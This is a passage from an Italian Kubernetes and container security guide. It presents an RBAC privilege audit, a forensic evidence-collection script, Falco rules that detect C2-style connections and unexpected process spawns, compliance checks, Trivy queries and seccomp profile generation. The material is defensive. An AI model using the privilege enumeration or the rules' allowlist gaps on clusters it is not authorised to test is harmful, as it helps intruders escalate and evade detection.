kubectl get clusterrolebindings -o json | jq -r '
  .items[] |
  select(.roleRef.name == "cluster-admin") |
  "  Binding: \(.metadata.name) → Subjects: \([.subjects[]? | "\(.kind)/\(.namespace // "cluster")/\(.name)"] | join(", "))"
'

# 2. Service Account con permessi eccessivi
echo ""
echo "=== [HIGH] ServiceAccounts with dangerous permissions ==="
for sa in $(kubectl get serviceaccounts -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'); do
  NS=$(echo $sa | cut -d/ -f1)
  NAME=$(echo $sa | cut -d/ -f2)

  # Verifica se il SA può creare pods, exec, o accedere a secrets
  DANGEROUS=""
  kubectl auth can-i create pods --as=system:serviceaccount:${NS}:${NAME} -n ${NS} 2>/dev/null | grep -q "yes" && DANGEROUS="${DANGEROUS} create-pods"
  kubectl auth can-i create pods/exec --as=system:serviceaccount:${NS}:${NAME} -n ${NS} 2>/dev/null | grep -q "yes" && DANGEROUS="${DANGEROUS} exec"
  kubectl auth can-i get secrets --as=system:serviceaccount:${NS}:${NAME} -n ${NS} 2>/dev/null | grep -q "yes" && DANGEROUS="${DANGEROUS} get-secrets"
  kubectl auth can-i '*' '*' --as=system:serviceaccount:${NS}:${NAME} 2>/dev/null | grep -q "yes" && DANGEROUS="${DANGEROUS} WILDCARD"

  if [ -n "$DANGEROUS" ]; then
    echo "  ${NS}/${NAME}: ${DANGEROUS}"
  fi
done

# 3. Service Account token auto-montati inutilmente
echo ""
echo "=== [MEDIUM] Pods with auto-mounted SA tokens ==="
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.automountServiceAccountToken != false) |
  select(.spec.serviceAccountName != null) |
  select(.spec.serviceAccountName != "default") |
  "\(.metadata.namespace)/\(.metadata.name) → SA: \(.spec.serviceAccountName)"
' | head -30

# 4. Roles con wildcards
echo ""
echo "=== [HIGH] Roles/ClusterRoles with wildcard permissions ==="
kubectl get clusterroles -o json | jq -r '
  .items[] |
  select(.rules[]? | (.apiGroups[]? == "*") or (.resources[]? == "*") or (.verbs[]? == "*")) |
  "  ClusterRole: \(.metadata.name) — Rules: \([.rules[] | select((.apiGroups[]? == "*") or (.resources[]? == "*") or (.verbs[]? == "*")) | "\(.verbs) on \(.resources) in \(.apiGroups)"] | join("; "))"
'

echo ""
echo "=== Audit Complete ==="
```

### 16.3 Digital Forensics and Incident Response (DFIR) per Container

La forensica dei container presenta sfide uniche: i container sono ephemeral (la maggior parte vive meno di 24 ore), i filesystem sono layered (overlay2), e il riavvio di un Pod distrugge tutte le evidenze volatili. Un framework DFIR efficace deve pre-posizionare meccanismi di cattura prima dell'incidente.

#### Fase 1: Evidence Preservation con crictl

```bash
#!/bin/bash
# container-forensics.sh — DFIR Evidence Collection
# Eseguire IMMEDIATAMENTE quando si sospetta compromissione
# NON riavviare o eliminare il container prima della raccolta evidenze

INCIDENT_ID="INC-$(date -u +%Y%m%d-%H%M%S)"
EVIDENCE_DIR="/forensics/${INCIDENT_ID}"
POD_NAME="${1:?Usage: $0 <pod-name> <namespace>}"
NAMESPACE="${2:?Usage: $0 <pod-name> <namespace>}"

mkdir -p "${EVIDENCE_DIR}/{volatile,filesystem,network,logs,metadata}"
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] DFIR collection started for ${NAMESPACE}/${POD_NAME}" | \
  tee "${EVIDENCE_DIR}/chain-of-custody.log"

# === VOLATILE EVIDENCE (raccogliere PRIMA di tutto) ===

# 1. Processi in esecuzione
echo "[*] Collecting running processes..."
kubectl exec -n "${NAMESPACE}" "${POD_NAME}" -- \
  ps auxwwf > "${EVIDENCE_DIR}/volatile/ps-aux.txt" 2>&1 || true

# 2. Connessioni di rete attive
echo "[*] Collecting network connections..."
kubectl exec -n "${NAMESPACE}" "${POD_NAME}" -- \
  cat /proc/net/tcp > "${EVIDENCE_DIR}/volatile/proc-net-tcp.txt" 2>&1 || true
kubectl exec -n "${NAMESPACE}" "${POD_NAME}" -- \
  cat /proc/net/tcp6 > "${EVIDENCE_DIR}/volatile/proc-net-tcp6.txt" 2>&1 || true

# 3. Environment variables (censurate per secrets)
echo "[*] Collecting environment (redacted)..."
kubectl exec -n "${NAMESPACE}" "${POD_NAME}" -- \
  env | sed 's/\(PASSWORD\|SECRET\|TOKEN\|KEY\|CREDENTIAL\)=.*/\1=<REDACTED>/gi' \
  > "${EVIDENCE_DIR}/volatile/env-redacted.txt" 2>&1 || true

# 4. Filesystem modifications (diff dal layer image)
echo "[*] Collecting filesystem modifications..."
CONTAINER_ID=$(kubectl get pod -n "${NAMESPACE}" "${POD_NAME}" \
  -o jsonpath='{.status.containerStatuses[0].containerID}' | sed 's|containerd://||')

# Usa crictl per ispezionare il container a livello runtime
sudo crictl inspect "${CONTAINER_ID}" > "${EVIDENCE_DIR}/metadata/crictl-inspect.json" 2>&1

# 5. Cattura filesystem completo del container
echo "[*] Capturing container filesystem..."
sudo crictl checkpoint --export="${EVIDENCE_DIR}/filesystem/checkpoint.tar" \
  "${CONTAINER_ID}" 2>&1 || true

# === NON-VOLATILE EVIDENCE ===

# 6. Pod metadata e events
echo "[*] Collecting Kubernetes metadata..."
kubectl get pod -n "${NAMESPACE}" "${POD_NAME}" -o yaml \
  > "${EVIDENCE_DIR}/metadata/pod-spec.yaml"
kubectl describe pod -n "${NAMESPACE}" "${POD_NAME}" \
  > "${EVIDENCE_DIR}/metadata/pod-describe.txt"
kubectl get events -n "${NAMESPACE}" --sort-by='.lastTimestamp' \
  --field-selector "involvedObject.name=${POD_NAME}" \
  > "${EVIDENCE_DIR}/metadata/pod-events.txt"

# 7. Container logs (current + previous)
echo "[*] Collecting container logs..."
kubectl logs -n "${NAMESPACE}" "${POD_NAME}" --all-containers \
  > "${EVIDENCE_DIR}/logs/current.log" 2>&1
kubectl logs -n "${NAMESPACE}" "${POD_NAME}" --all-containers --previous \
  > "${EVIDENCE_DIR}/logs/previous.log" 2>&1

# 8. Falco alerts per il Pod
echo "[*] Collecting Falco alerts..."
kubectl logs -l app.kubernetes.io/name=falco -n falco-system --since=24h | \
  grep "${POD_NAME}" > "${EVIDENCE_DIR}/logs/falco-alerts.log" 2>&1 || true

# 9. Hubble network flows (se Cilium è presente)
echo "[*] Collecting network flows..."
hubble observe --from-pod "${NAMESPACE}/${POD_NAME}" --last 1h \
  --output json > "${EVIDENCE_DIR}/network/hubble-flows.json" 2>&1 || true
hubble observe --to-pod "${NAMESPACE}/${POD_NAME}" --last 1h \
  --output json >> "${EVIDENCE_DIR}/network/hubble-flows.json" 2>&1 || true

# 10. Audit logs del Kubernetes API server
echo "[*] Collecting K8s audit logs..."
kubectl logs -n kube-system -l component=kube-apiserver --since=24h | \
  grep "\"user\".*\"${NAMESPACE}\"" \
  > "${EVIDENCE_DIR}/logs/k8s-audit.log" 2>&1 || true

# === INTEGRITY ===

# Calcola hash di tutti i file raccolti
echo "[*] Computing evidence hashes..."
find "${EVIDENCE_DIR}" -type f | while read f; do
  sha256sum "$f"
done > "${EVIDENCE_DIR}/evidence-hashes.sha256"

echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] DFIR collection completed" | \
  tee -a "${EVIDENCE_DIR}/chain-of-custody.log"
echo "Evidence directory: ${EVIDENCE_DIR}"
echo "Evidence hash: $(sha256sum "${EVIDENCE_DIR}/evidence-hashes.sha256" | cut -d' ' -f1)"
```

#### Fase 2: eBPF-Based Evidence Capture

Per incidenti in corso dove l'attaccante potrebbe modificare i log o i processi, la cattura basata su eBPF (tramite Falco, Tracee, o Tetragon) è l'unica fonte di evidenza affidabile poiché opera a livello kernel, invisibile al container.

```yaml
# Falco rule per cattura evidenze forensi
# Salvare come /etc/falco/rules.d/dfir-evidence.yaml

- rule: DFIR - Suspicious Process Execution in Production
  desc: Cattura ogni esecuzione di processo in container di produzione per analisi forense
  condition: >
    spawned_process and
    container.id != host and
    k8s.ns.name = "production" and
    not proc.name in (node, python, java, nginx, envoy, app) and
    not proc.pname in (containerd-shim, runc)
  output: >
    DFIR_EVIDENCE process_spawned
    (timestamp=%evt.time
     container_id=%container.id
     container_name=%container.name
     k8s_pod=%k8s.pod.name
     k8s_ns=%k8s.ns.name
     proc_name=%proc.name
     proc_cmdline=%proc.cmdline
     proc_pname=%proc.pname
     proc_ppid=%proc.ppid
     user=%user.name
     uid=%user.uid
     proc_cwd=%proc.cwd
     fd_name=%fd.name)
  priority: NOTICE
  tags: [forensics, dfir, container]

- rule: DFIR - Network Connection from Non-Standard Process
  desc: Cattura connessioni di rete da processi non-standard per correlazione C2
  condition: >
    evt.type in (connect, sendto, recvfrom) and
    container.id != host and
    k8s.ns.name = "production" and
    fd.type = ipv4 and
    not proc.name in (node, python, java, nginx, envoy, curl, wget) and
    not fd.sip in (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
  output: >
    DFIR_EVIDENCE external_connection
    (timestamp=%evt.time
     container_id=%container.id
     k8s_pod=%k8s.pod.name
     proc_name=%proc.name
     proc_cmdline=%proc.cmdline
     fd_name=%fd.name
     fd_sip=%fd.sip
     fd_sport=%fd.sport
     fd_cip=%fd.cip
     fd_cport=%fd.cport)
  priority: WARNING
  tags: [forensics, dfir, network, c2]

- rule: DFIR - File Modification in Read-Only Container
  desc: Cattura modifiche filesystem che non dovrebbero avvenire in container read-only
  condition: >
    (evt.type in (open, openat, openat2) and
     evt.is_open_write = true) and
    container.id != host and
    k8s.ns.name = "production" and
    not fd.name startswith /tmp and
    not fd.name startswith /proc and
    not fd.name startswith /dev
  output: >
    DFIR_EVIDENCE file_write
    (timestamp=%evt.time
     container_id=%container.id
     k8s_pod=%k8s.pod.name
     proc_name=%proc.name
     proc_cmdline=%proc.cmdline
     file_path=%fd.name
     user=%user.name
     uid=%user.uid)
  priority: WARNING
  tags: [forensics, dfir, filesystem]
```

### 16.4 Compliance Automation Framework

```bash
#!/bin/bash
# compliance-report.sh — Genera report di compliance container security
# Conforme a NIST SP 800-190, CIS Docker/Kubernetes Benchmarks

REPORT_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
REPORT_FILE="/var/reports/compliance-$(date -u +%Y%m%d).json"

echo "=== Container Security Compliance Report ==="
echo "Date: ${REPORT_DATE}"
echo "Framework: NIST SP 800-190 + CIS Benchmarks"
echo ""

# Sezione 1: Image Security Compliance
echo "--- Image Security ---"
IMAGE_TOTAL=$(kubectl get pods -A -o json | jq '[.items[].spec.containers[].image] | unique | length')
IMAGE_SIGNED=$(kubectl get pods -A -o json | jq -r '[.items[].spec.containers[].image] | unique | .[]' | \
  while read img; do cosign verify "$img" 2>/dev/null && echo "signed"; done | wc -l)
IMAGE_SCANNED=$(kubectl get vulnerabilityreports -A --no-headers 2>/dev/null | wc -l)
echo "Total unique images: $IMAGE_TOTAL"
echo "Signed images: $IMAGE_SIGNED"
echo "Scanned images: $IMAGE_SCANNED"

# Sezione 2: Pod Security Compliance
echo ""
echo "--- Pod Security Standards ---"
NS_RESTRICTED=$(kubectl get namespaces -l pod-security.kubernetes.io/enforce=restricted --no-headers 2>/dev/null | wc -l)
NS_BASELINE=$(kubectl get namespaces -l pod-security.kubernetes.io/enforce=baseline --no-headers 2>/dev/null | wc -l)
NS_PRIVILEGED=$(kubectl get namespaces --no-headers 2>/dev/null | wc -l)
NS_PRIVILEGED=$((NS_PRIVILEGED - NS_RESTRICTED - NS_BASELINE))
echo "Namespaces (restricted): $NS_RESTRICTED"
echo "Namespaces (baseline): $NS_BASELINE"
echo "Namespaces (privileged/unset): $NS_PRIVILEGED"

# Sezione 3: Runtime Security
echo ""
echo "--- Runtime Security ---"
FALCO_RUNNING=$(kubectl get pods -n falco-system -l app.kubernetes.io/name=falco --no-headers 2>/dev/null | grep -c Running)
TRIVY_OPERATOR=$(kubectl get pods -n trivy-system -l app.kubernetes.io/name=trivy-operator --no-headers 2>/dev/null | grep -c Running)
echo "Falco agents running: $FALCO_RUNNING"
echo "Trivy Operator running: $TRIVY_OPERATOR"

# Sezione 4: Network Policy Coverage
echo ""
echo "--- Network Policy Coverage ---"
NS_WITH_NETPOL=$(kubectl get networkpolicies -A --no-headers 2>/dev/null | awk '{print $1}' | sort -u | wc -l)
NS_TOTAL=$(kubectl get namespaces --no-headers 2>/dev/null | wc -l)
echo "Namespaces with NetworkPolicy: $NS_WITH_NETPOL / $NS_TOTAL"
echo "Coverage: $(echo "scale=1; $NS_WITH_NETPOL * 100 / $NS_TOTAL" | bc)%"

# Sezione 5: Encryption
echo ""
echo "--- Encryption Status ---"
ETCD_ENCRYPTED=$(kubectl get apiserver -o jsonpath='{.items[0].spec.encryption}' 2>/dev/null || echo "check manually")
echo "etcd encryption: $ETCD_ENCRYPTED"
WIREGUARD=$(kubectl -n kube-system exec ds/cilium -- cilium-dbg encrypt status 2>/dev/null | head -1 || echo "N/A")
echo "Network encryption: $WIREGUARD"

echo ""
echo "=== Report Complete ==="
echo "Timestamp: ${REPORT_DATE}"
```

### 16.5 Continuous Compliance con Trivy Operator

Il Trivy Operator esegue scanning continuo di tutte le immagini container nel cluster, generando report Kubernetes-native che possono essere interrogati con kubectl.

```bash
# Installazione Trivy Operator
helm install trivy-operator aquasecurity/trivy-operator \
  --namespace trivy-system --create-namespace \
  --set trivy.severity=HIGH,CRITICAL \
  --set compliance.failThreshold=0.8 \
  --set operator.scanJobTimeout=10m

# Query vulnerabilità per namespace
kubectl get vulnerabilityreports -n production \
  -o json | jq '
  .items[] |
  {
    image: .report.artifact.repository,
    critical: [.report.vulnerabilities[] | select(.severity == "CRITICAL")] | length,
    high: [.report.vulnerabilities[] | select(.severity == "HIGH")] | length
  } |
  select(.critical > 0 or .high > 0)'

# Report compliance CIS Kubernetes
kubectl get clustercompliancereports -o json | jq '
  .items[0].status.summary'

# Configmap audit — verifica configurazioni pericolose
kubectl get configauditreports -n production \
  -o json | jq '
  .items[] |
  select(.report.summary.criticalCount > 0 or .report.summary.highCount > 0) |
  {
    resource: .metadata.name,
    critical: .report.summary.criticalCount,
    high: .report.summary.highCount,
    checks_failed: [.report.checks[] | select(.success == false) | .title]
  }'

# RBAC assessment reports
kubectl get rbacassessmentreports -A -o json | jq '
  .items[] |
  select(.report.summary.criticalCount > 0) |
  {
    sa: .metadata.name,
    namespace: .metadata.namespace,
    critical: .report.summary.criticalCount,
    findings: [.report.checks[] | select(.success == false and .severity == "CRITICAL") | .title]
  }'

# Exposed secrets reports
kubectl get exposedsecretreports -A --no-headers 2>/dev/null
```

### 16.6 Security Profiles Operator — Generazione Automatica Profili

Il Security Profiles Operator (SPO) automatizza la creazione e gestione di profili seccomp, AppArmor, e SELinux per i container Kubernetes. Il workflow recording cattura le syscall effettive di un container durante l'esecuzione normale e genera un profilo seccomp minimale.

```yaml
# Installazione SPO
# kubectl apply -f https://github.com/kubernetes-sigs/security-profiles-operator/releases/download/v0.9.0/install.yaml

# Step 1: Avvia recording per generare profilo seccomp
apiVersion: security-profiles-operator.x-k8s.io/v1alpha1
kind: SeccompProfile
metadata:
  name: myapp-profile
  namespace: production
  annotations:
    spo.x-k8s.io/recording: "true"
spec:
  defaultAction: SCMP_ACT_LOG  # Log durante recording
  architectures:
  - SCMP_ARCH_X86_64
  - SCMP_ARCH_AARCH64

---
# Step 2: ProfileRecording — registra le syscall dell'app
apiVersion: security-profiles-operator.x-k8s.io/v1alpha1
kind: ProfileRecording
metadata:
  name: myapp-recording
  namespace: production
spec:
  kind: SeccompProfile
  recorder: logs  # o "bpf" per recording eBPF-based
  podSelector:
    matchLabels:
      app: myapp
      recording: active

---
# Step 3: Dopo il periodo di recording, il profilo generato sarà simile a:
apiVersion: security-profiles-operator.x-k8s.io/v1beta1
kind: SeccompProfile
metadata:
  name: myapp-hardened
  namespace: production
spec:
  defaultAction: SCMP_ACT_ERRNO
  architectures:
  - SCMP_ARCH_X86_64
  syscalls:
  - action: SCMP_ACT_ALLOW
    names:
    - accept4
    - bind
    - brk
    - clone
    - close
    - connect
    - epoll_create1
    - epoll_ctl
    - epoll_wait
    - exit_group
    - fcntl
    - fstat
    - futex
    - getpid
    - getsockname
    - getsockopt
    - listen
    - madvise
    - mmap
    - mprotect
    - munmap
    - nanosleep
    - newfstatat
    - openat
    - pipe2
    - read
    - recvfrom
    - rt_sigaction
    - rt_sigprocmask
    - sendto
    - setsockopt
    - socket
    - write
    # Tutte le altre syscall sono BLOCCATE (ERRNO)
```

```bash
# Applicare il profilo seccomp generato a un Deployment
kubectl patch deployment myapp -n production --type=json -p='[
  {"op": "add", "path": "/spec/template/spec/securityContext/seccompProfile",
   "value": {"type": "Localhost", "localhostProfile": "operator/production/myapp-hardened.json"}}
]'

# Verifica che il profilo è applicato
kubectl get pod -n production -l app=myapp \
  -o jsonpath='{.items[0].spec.securityContext.seccompProfile}'
# Output: {"type":"Localhost","localhostProfile":"operator/production/myapp-hardened.json"}

# Monitoraggio violazioni del profilo
kubectl logs -n security-profiles-operator -l app=spod -f | grep -i "seccomp\|violation"
```

---

## Riferimenti e Approfondimenti

| Resource | URL |
|----------|-----|
| CIS Docker Benchmark | https://www.cisecurity.org/benchmark/docker |
| CIS Kubernetes Benchmark | https://www.cisecurity.org/benchmark/kubernetes |
| NIST SP 800-190 (Container Security) | https://csrc.nist.gov/publications/detail/sp/800-190/final |
| Kubernetes Security Documentation | https://kubernetes.io/docs/concepts/security/ |
| Falco Documentation | https://falco.org/docs/ |
| SLSA Framework | https://slsa.dev/ |
| Sigstore Project | https://www.sigstore.dev/ |
| MITRE ATT&CK: Containers | https://attack.mitre.org/matrices/enterprise/containers/ |
| Kubernetes Threat Matrix (Microsoft) | https://microsoft.github.io/Threat-Matrix-for-Kubernetes/ |
| Kyverno Policies Library | https://kyverno.io/policies/ |
| OPA Gatekeeper Library | https://github.com/open-policy-agent/gatekeeper-library |
| Docker Security Best Practices | https://docs.docker.com/engine/security/ |

---

## Comandi Rapidi di Riferimento

```bash
# === Image Security ===
trivy image --severity HIGH,CRITICAL myregistry.io/app:v1.2.3
grype myregistry.io/app:v1.2.3 --fail-on high
cosign sign --key cosign.key myregistry.io/app:v1.2.3
cosign verify --key cosign.pub myregistry.io/app:v1.2.3
syft myregistry.io/app:v1.2.3 -o spdx-json

# === Docker Hardening ===
docker run --read-only --cap-drop ALL --security-opt no-new-privileges:true ...
docker-bench-security  # Run CIS benchmark

# === Kubernetes Security ===
kubectl auth can-i --list --as=system:serviceaccount:ns:sa-name
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostPID==true)'
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'

# === Runtime Security ===
kubectl logs -l app.kubernetes.io/name=falco -n falco-system -f
kubectl get vulnerabilityreports -A

# === Incident Response ===
kubectl get events --sort-by='.lastTimestamp' -n production
kubectl logs <pod> --all-containers --previous
kubectl debug <pod> --image=busybox --target=<container>
```
